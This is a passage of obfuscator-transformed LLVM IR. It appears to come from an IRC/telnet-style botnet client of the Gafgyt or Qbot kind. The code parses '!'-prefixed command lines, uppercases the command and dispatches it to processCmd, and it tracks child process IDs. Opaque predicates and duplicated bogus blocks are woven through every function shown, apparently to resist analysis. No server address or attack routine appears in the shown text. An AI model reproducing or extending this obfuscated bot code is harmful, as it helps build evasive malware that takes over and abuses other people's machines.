  %334 = load i32, i32* %14, align 4
  %335 = add nsw i32 %334, 1
  store i32 %335, i32* %14, align 4
  br label %198

; <label>:336:                                    ; preds = %198
  %337 = load i32, i32* %13, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 %338
  store i8 0, i8* %339, align 1
  %340 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i32 0, i32 0
  call void @trim(i8* %340)
  %341 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i32 0, i32 0
  store i8* %341, i8** %17, align 8
  %342 = load i8*, i8** %17, align 8
  %343 = load i8, i8* %342, align 1
  %344 = zext i8 %343 to i32
  %345 = icmp eq i32 %344, 33
  br i1 %345, label %346, label %674

; <label>:346:                                    ; preds = %336
  %347 = load i8*, i8** %17, align 8
  %348 = getelementptr inbounds i8, i8* %347, i64 1
  store i8* %348, i8** %18, align 8
  br label %349

; <label>:349:                                    ; preds = %361, %346
  %350 = load i8*, i8** %18, align 8
  %351 = load i8, i8* %350, align 1
  %352 = zext i8 %351 to i32
  %353 = icmp ne i32 %352, 32
  br i1 %353, label %354, label %359

; <label>:354:                                    ; preds = %349
  %355 = load i8*, i8** %18, align 8
  %356 = load i8, i8* %355, align 1
  %357 = zext i8 %356 to i32
  %358 = icmp ne i32 %357, 0
  br label %359

; <label>:359:                                    ; preds = %354, %349
  %360 = phi i1 [ false, %349 ], [ %358, %354 ]
  br i1 %360, label %361, label %364

; <label>:361:                                    ; preds = %359
  %362 = load i8*, i8** %18, align 8
  %363 = getelementptr inbounds i8, i8* %362, i32 1
  store i8* %363, i8** %18, align 8
  br label %349

; <label>:364:                                    ; preds = %359
  %365 = load i8*, i8** %18, align 8
  %366 = load i8, i8* %365, align 1
  %367 = zext i8 %366 to i32
  %368 = icmp eq i32 %367, 0
  br i1 %368, label %369, label %370

; <label>:369:                                    ; preds = %364
  br label %192

; <label>:370:                                    ; preds = %364
  %371 = load i32, i32* @x.101
  %372 = load i32, i32* @y.102
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %370
  %379 = load i8*, i8** %18, align 8
  store i8 0, i8* %379, align 1
  %380 = load i8*, i8** %17, align 8
  %381 = getelementptr inbounds i8, i8* %380, i64 1
  store i8* %381, i8** %18, align 8
  %382 = load i8*, i8** %17, align 8
  %383 = load i8*, i8** %18, align 8
  %384 = call i64 @strlen(i8* %383) #9
  %385 = getelementptr inbounds i8, i8* %382, i64 %384
  %386 = getelementptr inbounds i8, i8* %385, i64 2
  store i8* %386, i8** %17, align 8
  %387 = load i32, i32* @x.101
  %388 = load i32, i32* @y.102
  %389 = sub i32 %387, 1
  %390 = mul i32 %387, %389
  %391 = urem i32 %390, 2
  %392 = icmp eq i32 %391, 0
  %393 = icmp slt i32 %388, 10
  %394 = or i1 %392, %393
  br i1 %394, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br label %395

; <label>:395:                                    ; preds = %originalBBpart2118, %originalBBpart277
  %396 = load i32, i32* @x.101
  %397 = load i32, i32* @y.102
  %398 = sub i32 %396, 1
  %399 = mul i32 %396, %398
  %400 = urem i32 %399, 2
  %401 = icmp eq i32 %400, 0
  %402 = icmp slt i32 %397, 10
  %403 = or i1 %401, %402
  br i1 %403, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %395
  %404 = load i8*, i8** %17, align 8
  %405 = load i8*, i8** %17, align 8
  %406 = call i64 @strlen(i8* %405) #9
  %407 = sub i64 %406, 1
  %408 = getelementptr inbounds i8, i8* %404, i64 %407
  %409 = load i8, i8* %408, align 1
  %410 = zext i8 %409 to i32
  %411 = icmp eq i32 %410, 10
  %412 = load i32, i32* @x.101
  %413 = load i32, i32* @y.102
  %414 = sub i32 %412, 1
  %415 = mul i32 %412, %414
  %416 = urem i32 %415, 2
  %417 = icmp eq i32 %416, 0
  %418 = icmp slt i32 %413, 10
  %419 = or i1 %417, %418
  br i1 %419, label %originalBBpart291, label %originalBB79alteredBB

originalBBpart291:                                ; preds = %originalBB79
  br i1 %411, label %445, label %420

; <label>:420:                                    ; preds = %originalBBpart291
  %421 = load i32, i32* @x.101
  %422 = load i32, i32* @y.102
  %423 = sub i32 %421, 1
  %424 = mul i32 %421, %423
  %425 = urem i32 %424, 2
  %426 = icmp eq i32 %425, 0
  %427 = icmp slt i32 %422, 10
  %428 = or i1 %426, %427
  br i1 %428, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %420
  %429 = load i8*, i8** %17, align 8
  %430 = load i8*, i8** %17, align 8
  %431 = call i64 @strlen(i8* %430) #9
  %432 = sub i64 %431, 1
  %433 = getelementptr inbounds i8, i8* %429, i64 %432
  %434 = load i8, i8* %433, align 1
  %435 = zext i8 %434 to i32
  %436 = icmp eq i32 %435, 13
  %437 = load i32, i32* @x.101
  %438 = load i32, i32* @y.102
  %439 = sub i32 %437, 1
  %440 = mul i32 %437, %439
  %441 = urem i32 %440, 2
  %442 = icmp eq i32 %441, 0
  %443 = icmp slt i32 %438, 10
  %444 = or i1 %442, %443
  br i1 %444, label %originalBBpart2103, label %originalBB93alteredBB

originalBBpart2103:                               ; preds = %originalBB93
  br label %445

; <label>:445:                                    ; preds = %originalBBpart2103, %originalBBpart291
  %446 = phi i1 [ true, %originalBBpart291 ], [ %436, %originalBBpart2103 ]
  br i1 %446, label %447, label %469

; <label>:447:                                    ; preds = %445
  %448 = load i32, i32* @x.101
  %449 = load i32, i32* @y.102
  %450 = sub i32 %448, 1
  %451 = mul i32 %448, %450
  %452 = urem i32 %451, 2
  %453 = icmp eq i32 %452, 0
  %454 = icmp slt i32 %449, 10
  %455 = or i1 %453, %454
  br i1 %455, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %447
  %456 = load i8*, i8** %17, align 8
  %457 = load i8*, i8** %17, align 8
  %458 = call i64 @strlen(i8* %457) #9
  %459 = sub i64 %458, 1
  %460 = getelementptr inbounds i8, i8* %456, i64 %459
  store i8 0, i8* %460, align 1
  %461 = load i32, i32* @x.101
  %462 = load i32, i32* @y.102
  %463 = sub i32 %461, 1
  %464 = mul i32 %461, %463
  %465 = urem i32 %464, 2
  %466 = icmp eq i32 %465, 0
  %467 = icmp slt i32 %462, 10
  %468 = or i1 %466, %467
  br i1 %468, label %originalBBpart2118, label %originalBB105alteredBB

originalBBpart2118:                               ; preds = %originalBB105
  br label %395

; <label>:469:                                    ; preds = %445
  %470 = load i32, i32* @x.101
  %471 = load i32, i32* @y.102
  %472 = sub i32 %470, 1
  %473 = mul i32 %470, %472
  %474 = urem i32 %473, 2
  %475 = icmp eq i32 %474, 0
  %476 = icmp slt i32 %471, 10
  %477 = or i1 %475, %476
  br i1 %477, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %469
  %478 = load i8*, i8** %17, align 8
  store i8* %478, i8** %19, align 8
  %479 = load i32, i32* @x.101
  %480 = load i32, i32* @y.102
  %481 = sub i32 %479, 1
  %482 = mul i32 %479, %481
  %483 = urem i32 %482, 2
  %484 = icmp eq i32 %483, 0
  %485 = icmp slt i32 %480, 10
  %486 = or i1 %484, %485
  br i1 %486, label %originalBBpart2122, label %originalBB120alteredBB

originalBBpart2122:                               ; preds = %originalBB120
  br label %487

; <label>:487:                                    ; preds = %515, %originalBBpart2122
  %488 = load i8*, i8** %17, align 8
  %489 = load i8, i8* %488, align 1
  %490 = zext i8 %489 to i32
  %491 = icmp ne i32 %490, 32
  br i1 %491, label %492, label %513

; <label>:492:                                    ; preds = %487
  %493 = load i32, i32* @x.101
  %494 = load i32, i32* @y.102
  %495 = sub i32 %493, 1
  %496 = mul i32 %493, %495
  %497 = urem i32 %496, 2
  %498 = icmp eq i32 %497, 0
  %499 = icmp slt i32 %494, 10
  %500 = or i1 %498, %499
  br i1 %500, label %originalBB124, label %originalBB124alteredBB

originalBB124:                                    ; preds = %originalBB124alteredBB, %492
  %501 = load i8*, i8** %17, align 8
  %502 = load i8, i8* %501, align 1
  %503 = zext i8 %502 to i32
  %504 = icmp ne i32 %503, 0
  %505 = load i32, i32* @x.101
  %506 = load i32, i32* @y.102
  %507 = sub i32 %505, 1
  %508 = mul i32 %505, %507
  %509 = urem i32 %508, 2
  %510 = icmp eq i32 %509, 0
  %511 = icmp slt i32 %506, 10
  %512 = or i1 %510, %511
  br i1 %512, label %originalBBpart2126, label %originalBB124alteredBB

originalBBpart2126:                               ; preds = %originalBB124
  br label %513

; <label>:513:                                    ; preds = %originalBBpart2126, %487
  %514 = phi i1 [ false, %487 ], [ %504, %originalBBpart2126 ]
  br i1 %514, label %515, label %518

; <label>:515:                                    ; preds = %513
  %516 = load i8*, i8** %17, align 8
  %517 = getelementptr inbounds i8, i8* %516, i32 1
  store i8* %517, i8** %17, align 8
  br label %487

; <label>:518:                                    ; preds = %513
  %519 = load i8*, i8** %17, align 8
  store i8 0, i8* %519, align 1
  %520 = load i8*, i8** %17, align 8
  %521 = getelementptr inbounds i8, i8* %520, i32 1
  store i8* %521, i8** %17, align 8
  %522 = load i8*, i8** %19, align 8
  store i8* %522, i8** %20, align 8
  br label %523

; <label>:523:                                    ; preds = %originalBBpart2134, %518
  %524 = load i32, i32* @x.101
  %525 = load i32, i32* @y.102
  %526 = sub i32 %524, 1
  %527 = mul i32 %524, %526
  %528 = urem i32 %527, 2
  %529 = icmp eq i32 %528, 0
  %530 = icmp slt i32 %525, 10
  %531 = or i1 %529, %530
  br i1 %531, label %originalBB128, label %originalBB128alteredBB

originalBB128:                                    ; preds = %originalBB128alteredBB, %523
  %532 = load i8*, i8** %20, align 8
  %533 = load i8, i8* %532, align 1
  %534 = icmp ne i8 %533, 0
  %535 = load i32, i32* @x.101
  %536 = load i32, i32* @y.102
  %537 = sub i32 %535, 1
  %538 = mul i32 %535, %537
  %539 = urem i32 %538, 2
  %540 = icmp eq i32 %539, 0
  %541 = icmp slt i32 %536, 10
  %542 = or i1 %540, %541
  br i1 %542, label %originalBBpart2130, label %originalBB128alteredBB

originalBBpart2130:                               ; preds = %originalBB128
  br i1 %534, label %543, label %568

; <label>:543:                                    ; preds = %originalBBpart2130
  %544 = load i32, i32* @x.101
  %545 = load i32, i32* @y.102
  %546 = sub i32 %544, 1
  %547 = mul i32 %544, %546
  %548 = urem i32 %547, 2
  %549 = icmp eq i32 %548, 0
  %550 = icmp slt i32 %545, 10
  %551 = or i1 %549, %550
  br i1 %551, label %originalBB132, label %originalBB132alteredBB

originalBB132:                                    ; preds = %originalBB132alteredBB, %543
  %552 = load i8*, i8** %20, align 8
  %553 = load i8, i8* %552, align 1
  %554 = zext i8 %553 to i32
  %555 = call i32 @toupper(i32 %554) #9
  %556 = trunc i32 %555 to i8
  %557 = load i8*, i8** %20, align 8
  store i8 %556, i8* %557, align 1
  %558 = load i8*, i8** %20, align 8
  %559 = getelementptr inbounds i8, i8* %558, i32 1
  store i8* %559, i8** %20, align 8
  %560 = load i32, i32* @x.101
  %561 = load i32, i32* @y.102
  %562 = sub i32 %560, 1
  %563 = mul i32 %560, %562
  %564 = urem i32 %563, 2
  %565 = icmp eq i32 %564, 0
  %566 = icmp slt i32 %561, 10
  %567 = or i1 %565, %566
  br i1 %567, label %originalBBpart2134, label %originalBB132alteredBB

originalBBpart2134:                               ; preds = %originalBB132
  br label %523

; <label>:568:                                    ; preds = %originalBBpart2130
  store i32 1, i32* %22, align 4
  %569 = load i8*, i8** %17, align 8
  %570 = call i8* @strtok(i8* %569, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.172, i32 0, i32 0)) #3
  store i8* %570, i8** %23, align 8
  %571 = load i8*, i8** %19, align 8
  %572 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %571, i8** %572, align 16
  br label %573

; <label>:573:                                    ; preds = %620, %568
  %574 = load i8*, i8** %23, align 8
  %575 = icmp ne i8* %574, null
  br i1 %575, label %576, label %622

; <label>:576:                                    ; preds = %573
  %577 = load i32, i32* @x.101
  %578 = load i32, i32* @y.102
  %579 = sub i32 %577, 1
  %580 = mul i32 %577, %579
  %581 = urem i32 %580, 2
  %582 = icmp eq i32 %581, 0
  %583 = icmp slt i32 %578, 10
  %584 = or i1 %582, %583
  br i1 %584, label %originalBB136, label %originalBB136alteredBB

originalBB136:                                    ; preds = %originalBB136alteredBB, %576
  %585 = load i8*, i8** %23, align 8
  %586 = load i8, i8* %585, align 1
  %587 = zext i8 %586 to i32
  %588 = icmp ne i32 %587, 10
  %589 = load i32, i32* @x.101
  %590 = load i32, i32* @y.102
  %591 = sub i32 %589, 1
  %592 = mul i32 %589, %591
  %593 = urem i32 %592, 2
  %594 = icmp eq i32 %593, 0
  %595 = icmp slt i32 %590, 10
  %596 = or i1 %594, %595
  br i1 %596, label %originalBBpart2138, label %originalBB136alteredBB

originalBBpart2138:                               ; preds = %originalBB136
  br i1 %588, label %597, label %620

; <label>:597:                                    ; preds = %originalBBpart2138
  %598 = load i8*, i8** %23, align 8
  %599 = call i64 @strlen(i8* %598) #9
  %600 = add i64 %599, 1
  %601 = call noalias i8* @malloc(i64 %600) #3
  %602 = load i32, i32* %22, align 4
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %603
  store i8* %601, i8** %604, align 8
  %605 = load i32, i32* %22, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %606
  %608 = load i8*, i8** %607, align 8
  %609 = load i8*, i8** %23, align 8
  %610 = call i64 @strlen(i8* %609) #9
  %611 = add i64 %610, 1
  call void @llvm.memset.p0i8.i64(i8* %608, i8 0, i64 %611, i32 1, i1 false)
  %612 = load i32, i32* %22, align 4
  %613 = sext i32 %612 to i64
  %614 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %613
  %615 = load i8*, i8** %614, align 8
  %616 = load i8*, i8** %23, align 8
  %617 = call i8* @strcpy(i8* %615, i8* %616) #3
  %618 = load i32, i32* %22, align 4
  %619 = add nsw i32 %618, 1
  store i32 %619, i32* %22, align 4
  br label %620

; <label>:620:                                    ; preds = %597, %originalBBpart2138
  %621 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.172, i32 0, i32 0)) #3
  store i8* %621, i8** %23, align 8
  br label %573

; <label>:622:                                    ; preds = %573
  %623 = load i32, i32* %22, align 4
  %624 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %623, i8** %624)
  %625 = load i32, i32* %22, align 4
  %626 = icmp sgt i32 %625, 1
  br i1 %626, label %627, label %673

; <label>:627:                                    ; preds = %622
  %628 = load i32, i32* @x.101
  %629 = load i32, i32* @y.102
  %630 = sub i32 %628, 1
  %631 = mul i32 %628, %630
  %632 = urem i32 %631, 2
  %633 = icmp eq i32 %632, 0
  %634 = icmp slt i32 %629, 10
  %635 = or i1 %633, %634
  br i1 %635, label %originalBB140, label %originalBB140alteredBB

originalBB140:                                    ; preds = %originalBB140alteredBB, %627
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  %636 = load i32, i32* @x.101
  %637 = load i32, i32* @y.102
  %638 = sub i32 %636, 1
  %639 = mul i32 %636, %638
  %640 = urem i32 %639, 2
  %641 = icmp eq i32 %640, 0
  %642 = icmp slt i32 %637, 10
  %643 = or i1 %641, %642
  br i1 %643, label %originalBBpart2142, label %originalBB140alteredBB

originalBBpart2142:                               ; preds = %originalBB140
  br label %644

; <label>:644:                                    ; preds = %669, %originalBBpart2142
  %645 = load i32, i32* %24, align 4
  %646 = load i32, i32* %22, align 4
  %647 = icmp slt i32 %645, %646
  br i1 %647, label %648, label %672

; <label>:648:                                    ; preds = %644
  %649 = load i32, i32* @x.101
  %650 = load i32, i32* @y.102
  %651 = sub i32 %649, 1
  %652 = mul i32 %649, %651
  %653 = urem i32 %652, 2
  %654 = icmp eq i32 %653, 0
  %655 = icmp slt i32 %650, 10
  %656 = or i1 %654, %655
  br i1 %656, label %originalBB144, label %originalBB144alteredBB

originalBB144:                                    ; preds = %originalBB144alteredBB, %648
  %657 = load i32, i32* %24, align 4
  %658 = sext i32 %657 to i64
  %659 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %658
  %660 = load i8*, i8** %659, align 8
  call void @free(i8* %660) #3
  %661 = load i32, i32* @x.101
  %662 = load i32, i32* @y.102
  %663 = sub i32 %661, 1
  %664 = mul i32 %661, %663
  %665 = urem i32 %664, 2
  %666 = icmp eq i32 %665, 0
  %667 = icmp slt i32 %662, 10
  %668 = or i1 %666, %667
  br i1 %668, label %originalBBpart2146, label %originalBB144alteredBB

originalBBpart2146:                               ; preds = %originalBB144
  br label %669

; <label>:669:                                    ; preds = %originalBBpart2146
  %670 = load i32, i32* %24, align 4
  %671 = add nsw i32 %670, 1
  store i32 %671, i32* %24, align 4
  br label %644

; <label>:672:                                    ; preds = %644
  br label %673

; <label>:673:                                    ; preds = %672, %622
  br label %674

; <label>:674:                                    ; preds = %673, %336
  %675 = load i32, i32* @x.101
  %676 = load i32, i32* @y.102
  %677 = sub i32 %675, 1
  %678 = mul i32 %675, %677
  %679 = urem i32 %678, 2
  %680 = icmp eq i32 %679, 0
  %681 = icmp slt i32 %676, 10
  %682 = or i1 %680, %681
  br i1 %682, label %originalBB148, label %originalBB148alteredBB

originalBB148:                                    ; preds = %originalBB148alteredBB, %674
  %683 = load i32, i32* @x.101
  %684 = load i32, i32* @y.102
  %685 = sub i32 %683, 1
  %686 = mul i32 %683, %685
  %687 = urem i32 %686, 2
  %688 = icmp eq i32 %687, 0
  %689 = icmp slt i32 %684, 10
  %690 = or i1 %688, %689
  br i1 %690, label %originalBBpart2150, label %originalBB148alteredBB

originalBBpart2150:                               ; preds = %originalBB148
  br label %192

; <label>:691:                                    ; preds = %192
  br label %180
                                                  ; No predecessors!
  %693 = load i32, i32* @x.101
  %694 = load i32, i32* @y.102
  %695 = sub i32 %693, 1
  %696 = mul i32 %693, %695
  %697 = urem i32 %696, 2
  %698 = icmp eq i32 %697, 0
  %699 = icmp slt i32 %694, 10
  %700 = or i1 %698, %699
  br i1 %700, label %originalBB152, label %originalBB152alteredBB

originalBB152:                                    ; preds = %originalBB152alteredBB, %692
  %701 = load i32, i32* %3, align 4
  %702 = load i32, i32* @x.101
  %703 = load i32, i32* @y.102
  %704 = sub i32 %702, 1
  %705 = mul i32 %702, %704
  %706 = urem i32 %705, 2
  %707 = icmp eq i32 %706, 0
  %708 = icmp slt i32 %703, 10
  %709 = or i1 %707, %708
  br i1 %709, label %originalBBpart2154, label %originalBB152alteredBB

originalBBpart2154:                               ; preds = %originalBB152
  ret i32 %701

originalBBalteredBB:                              ; preds = %originalBB, %65
  %710 = load i32, i32* %9, align 4
  %711 = icmp ne i32 %710, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %88
  %712 = load i32, i32* %10, align 4
  %713 = icmp ne i32 %712, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %109
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %126
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %144
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %161
  %714 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.169, i32 0, i32 0)) #3
  %715 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %211
  %716 = load i32, i32* %14, align 4
  %_ = shl i32 %716, 1
  %_23 = sub i32 %716, 1
  %gen = mul i32 %_23, 1
  %_24 = sub i32 %716, 1
  %gen25 = mul i32 %_24, 1
  %_26 = sub i32 %716, 1
  %gen27 = mul i32 %_26, 1
  %_28 = sub i32 %716, 1
  %gen29 = mul i32 %_28, 1
  %_30 = shl i32 %716, 1
  %_31 = sub i32 0, %716
  %gen32 = add i32 %_31, 1
  %717 = add nsw i32 %716, 1
  store i32 %717, i32* %16, align 4
  br label %originalBB22

originalBB36alteredBB:                            ; preds = %originalBB36, %230
  %718 = load i32, i32* %16, align 4
  %719 = zext i32 %718 to i64
  %720 = load i64, i64* @numpids, align 8
  %721 = icmp ult i64 %719, %720
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %265
  %722 = load i32*, i32** @pids, align 8
  %723 = load i32, i32* %16, align 4
  %_41 = sub i32 %723, 1
  %gen42 = mul i32 %_41, 1
  %_43 = sub i32 0, %723
  %gen44 = add i32 %_43, 1
  %_45 = sub i32 0, %723
  %gen46 = add i32 %_45, 1
  %_47 = sub i32 %723, 1
  %gen48 = mul i32 %_47, 1
  %_49 = sub i32 0, %723
  %gen50 = add i32 %_49, 1
  %_51 = sub i32 %723, 1
  %gen52 = mul i32 %_51, 1
  %_53 = sub i32 %723, 1
  %gen54 = mul i32 %_53, 1
  %_55 = shl i32 %723, 1
  %724 = sub i32 %723, 1
  %725 = zext i32 %724 to i64
  %726 = getelementptr inbounds i32, i32* %722, i64 %725
  store i32 0, i32* %726, align 4
  %727 = load i64, i64* @numpids, align 8
  %_56 = sub i64 0, %727
  %gen57 = add i64 %_56, -1
  %_58 = shl i64 %727, -1
  %728 = add i64 %727, -1
  store i64 %728, i64* @numpids, align 8
  %729 = load i64, i64* @numpids, align 8
  %_59 = shl i64 %729, 1
  %_60 = shl i64 %729, 1
  %_61 = sub i64 0, %729
  %gen62 = add i64 %_61, 1
  %_63 = sub i64 %729, 1
  %gen64 = mul i64 %_63, 1
  %730 = add i64 %729, 1
  %_65 = shl i64 %730, 4
  %_66 = sub i64 %730, 4
  %gen67 = mul i64 %_66, 4
  %731 = mul i64 %730, 4
  %732 = call noalias i8* @malloc(i64 %731) #3
  %733 = bitcast i8* %732 to i32*
  store i32* %733, i32** %15, align 8
  store i32 0, i32* %16, align 4
  br label %originalBB40

originalBB71alteredBB:                            ; preds = %originalBB71, %312
  %734 = load i32*, i32** @pids, align 8
  %735 = bitcast i32* %734 to i8*
  call void @free(i8* %735) #3
  %736 = load i32*, i32** %15, align 8
  store i32* %736, i32** @pids, align 8
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %370
  %737 = load i8*, i8** %18, align 8
  store i8 0, i8* %737, align 1
  %738 = load i8*, i8** %17, align 8
  %739 = getelementptr inbounds i8, i8* %738, i64 1
  store i8* %739, i8** %18, align 8
  %740 = load i8*, i8** %17, align 8
  %741 = load i8*, i8** %18, align 8
  %742 = call i64 @strlen(i8* %741) #9
  %743 = getelementptr inbounds i8, i8* %740, i64 %742
  %744 = getelementptr inbounds i8, i8* %743, i64 2
  store i8* %744, i8** %17, align 8
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %395
  %745 = load i8*, i8** %17, align 8
  %746 = load i8*, i8** %17, align 8
  %747 = call i64 @strlen(i8* %746) #9
  %_80 = sub i64 0, %747
  %gen81 = add i64 %_80, 1
  %_82 = sub i64 0, %747
  %gen83 = add i64 %_82, 1
  %_84 = sub i64 %747, 1
  %gen85 = mul i64 %_84, 1
  %_86 = sub i64 0, %747
  %gen87 = add i64 %_86, 1
  %_88 = shl i64 %747, 1
  %_89 = shl i64 %747, 1
  %748 = sub i64 %747, 1
  %749 = getelementptr inbounds i8, i8* %745, i64 %748
  %750 = load i8, i8* %749, align 1
  %751 = zext i8 %750 to i32
  %752 = icmp eq i32 %751, 10
  br label %originalBB79

originalBB93alteredBB:                            ; preds = %originalBB93, %420
  %753 = load i8*, i8** %17, align 8
  %754 = load i8*, i8** %17, align 8
  %755 = call i64 @strlen(i8* %754) #9
  %_94 = shl i64 %755, 1
  %_95 = sub i64 0, %755
  %gen96 = add i64 %_95, 1
  %_97 = shl i64 %755, 1
  %_98 = sub i64 %755, 1
  %gen99 = mul i64 %_98, 1
  %_100 = sub i64 %755, 1
  %gen101 = mul i64 %_100, 1
  %756 = sub i64 %755, 1
  %757 = getelementptr inbounds i8, i8* %753, i64 %756
  %758 = load i8, i8* %757, align 1
  %759 = zext i8 %758 to i32
  %760 = icmp eq i32 %759, 13
  br label %originalBB93

originalBB105alteredBB:                           ; preds = %originalBB105, %447
  %761 = load i8*, i8** %17, align 8
  %762 = load i8*, i8** %17, align 8
  %763 = call i64 @strlen(i8* %762) #9
  %_106 = sub i64 0, %763
  %gen107 = add i64 %_106, 1
  %_108 = sub i64 0, %763
  %gen109 = add i64 %_108, 1
  %_110 = sub i64 %763, 1
  %gen111 = mul i64 %_110, 1
  %_112 = sub i64 0, %763
  %gen113 = add i64 %_112, 1
  %_114 = shl i64 %763, 1
  %_115 = sub i64 %763, 1
  %gen116 = mul i64 %_115, 1
  %764 = sub i64 %763, 1
  %765 = getelementptr inbounds i8, i8* %761, i64 %764
  store i8 0, i8* %765, align 1
  br label %originalBB105

originalBB120alteredBB:                           ; preds = %originalBB120, %469
  %766 = load i8*, i8** %17, align 8
  store i8* %766, i8** %19, align 8
  br label %originalBB120

originalBB124alteredBB:                           ; preds = %originalBB124, %492
  %767 = load i8*, i8** %17, align 8
  %768 = load i8, i8* %767, align 1
  %769 = zext i8 %768 to i32
  %770 = icmp ne i32 %769, 0
  br label %originalBB124

originalBB128alteredBB:                           ; preds = %originalBB128, %523
  %771 = load i8*, i8** %20, align 8
  %772 = load i8, i8* %771, align 1
  %773 = icmp ne i8 %772, 0
  br label %originalBB128

originalBB132alteredBB:                           ; preds = %originalBB132, %543
  %774 = load i8*, i8** %20, align 8
  %775 = load i8, i8* %774, align 1
  %776 = zext i8 %775 to i32
  %777 = call i32 @toupper(i32 %776) #9
  %778 = trunc i32 %777 to i8
  %779 = load i8*, i8** %20, align 8
  store i8 %778, i8* %779, align 1
  %780 = load i8*, i8** %20, align 8
  %781 = getelementptr inbounds i8, i8* %780, i32 1
  store i8* %781, i8** %20, align 8
  br label %originalBB132

originalBB136alteredBB:                           ; preds = %originalBB136, %576
  %782 = load i8*, i8** %23, align 8
  %783 = load i8, i8* %782, align 1
  %784 = zext i8 %783 to i32
  %785 = icmp ne i32 %784, 10
  br label %originalBB136

originalBB140alteredBB:                           ; preds = %originalBB140, %627
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  br label %originalBB140

originalBB144alteredBB:                           ; preds = %originalBB144, %648
  %786 = load i32, i32* %24, align 4
  %787 = sext i32 %786 to i64
  %788 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %787
  %789 = load i8*, i8** %788, align 8
  call void @free(i8* %789) #3
  br label %originalBB144

originalBB148alteredBB:                           ; preds = %originalBB148, %674
  br label %originalBB148

originalBB152alteredBB:                           ; preds = %originalBB152, %692
  %790 = load i32, i32* %3, align 4
  br label %originalBB152
}

; Function Attrs: nounwind
declare i32 @unlink(i8*) #1

; Function Attrs: nounwind
declare i32 @prctl(i32, ...) #1

declare i32 @waitpid(i32, i32*, i32) #2

; Function Attrs: nounwind
declare i32 @chdir(i8*) #1

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #1

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = load i32, i32* @x.103
  %6 = load i32, i32* @y.104
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8**, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  store i8** %0, i8*** %13, align 8
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  store i32 %3, i32* %16, align 4
  store i32 0, i32* %17, align 4
  store i32 32, i32* %18, align 4
  %21 = load i32, i32* %15, align 4
  %22 = icmp sgt i32 %21, 0
  %23 = load i32, i32* @x.103
  %24 = load i32, i32* @y.104
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %122

; <label>:31:                                     ; preds = %originalBBpart2
  store i32 0, i32* %19, align 4
  %32 = load i8*, i8** %14, align 8
  store i8* %32, i8** %20, align 8
  br label %33

; <label>:33:                                     ; preds = %originalBBpart213, %31
  %34 = load i8*, i8** %20, align 8
  %35 = load i8, i8* %34, align 1
  %36 = icmp ne i8 %35, 0
  br i1 %36, label %37, label %75

; <label>:37:                                     ; preds = %33
  %38 = load i32, i32* @x.103
  %39 = load i32, i32* @y.104
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
